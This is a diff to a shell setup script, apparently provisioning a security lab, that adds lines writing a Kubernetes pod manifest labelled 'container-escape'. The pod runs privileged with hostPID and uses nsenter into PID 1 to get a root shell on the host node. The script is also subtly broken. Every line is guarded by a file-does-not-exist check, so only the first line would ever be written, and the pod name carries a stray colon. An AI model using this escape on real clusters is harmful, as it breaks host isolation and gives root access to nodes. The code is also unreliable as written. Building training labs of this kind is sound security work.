@@ -28,3 +28,20 @@ sudo [ ! -f $ROOT_DIR/start_ruby_webserver ] && echo "ruby -run -ehttpd . -p8001
 sudo chmod -R +x $ROOT_DIR
 
 sudo [ ! -f $ROOT_DIR/pub-ip ] && echo $PUBLIC_IP > $ROOT_DIR/pub-ip
+
+# create pod-esc file
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo 'apiVersion: v1' > $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo 'kind: Pod' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo 'metadata:' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  name: priv-and-hostpid-exec-pod:' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  labels:' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    app: container-escape' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo 'spec:' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  hostPID: true' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  containers:' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  - name: priv-and-hostpid-pod' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    image: ubuntu' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    tty: true' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    securityContext:' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '      privileged: true' >> $ROOT_DIR/pod-esc
+sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]' >> $ROOT_DIR/pod-esc
